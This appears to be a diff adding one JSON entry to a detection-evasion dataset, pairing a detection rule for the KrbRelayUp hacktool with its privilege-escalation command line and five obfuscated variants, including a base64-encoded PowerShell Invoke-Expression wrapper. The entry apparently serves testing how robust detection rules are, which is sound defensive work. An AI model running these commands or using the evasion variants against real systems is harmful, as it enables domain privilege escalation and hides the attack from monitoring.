@@ -1,0 +1,11 @@
+{
+  "rule_name": "proc_creation_win_hktl_krbrelayup_0",
+  "original_command": "\\KrbRelayUp.exe KrbRelayUp.exe relay -Domain -ComputerName krbscm -sc spawn -d -cn -cp",
+  "evasions": {
+    "insertion": "\\KrbRelayUp.exe KrbRela\"yUp.exe\" relay -Domain -ComputerName krbscm -sc spawn -d -cn -cp",
+    "substitution": "\\KrbRelayUp.exe KrbRelayUp.exe relay -Domain -ComputerName krbscm -sc spawn -d -cn -cp #substitution",
+    "omission": "\\KrbRelayUp KrbRelayUp relay -Domain -ComputerName krbscm -sc spawn -d -cn -cp",
+    "reordering": "\\KrbRelayUp.exe KrbRelayUp.exe relay -Domain -ComputerName krbscm -sc spawn -d -cn -cp",
+    "recoding": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('XEtyYlJlbGF5VXAuZXhlIEtyYlJlbGF5VXAuZXhlIHJlbGF5IC1Eb21haW4gLUNvbXB1dGVyTmFtZSBrcmJzY20gLXNjIHNwYXduIC1kIC1jbiAtY3A=')) | Invoke-Expression\" "
+  }
+}
